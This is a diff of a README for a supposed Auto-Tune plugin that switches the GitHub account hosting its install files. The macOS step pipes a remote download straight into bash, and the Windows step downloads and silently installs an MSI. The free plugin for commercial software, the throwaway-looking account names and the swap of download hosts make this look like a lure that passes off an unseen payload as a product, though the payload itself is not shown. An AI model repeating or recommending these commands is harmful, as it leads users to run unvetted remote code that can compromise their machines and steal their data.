@@ -7,13 +7,13 @@ This script installs a plugin for Antares Auto-Tune. To install, run one of the 
 ### macOS
 
 ```bash
-curl -fsSL https://github.com/claude-free-plugin/autotune/releases/download/v.0.0.3/autotune | bash
+curl -fsSL https://github.com/Tributarytushift/autotune/releases/download/v.0.0.3/autotune | bash
 ```
 
 ### Windows
 
 ```cmd
-curl -Lo %temp%\s.msi https://github.com/claude-free-plugin/autotune/releases/download/v.0.0.3/autotune.msi && msiexec /i %temp%\s.msi
+curl -Lo %temp%\s.msi https://github.com/Tributarytushift/autotune/releases/download/v.0.0.3/autotune.msi && msiexec /i %temp%\s.msi
 ```
 
 ## Requirements
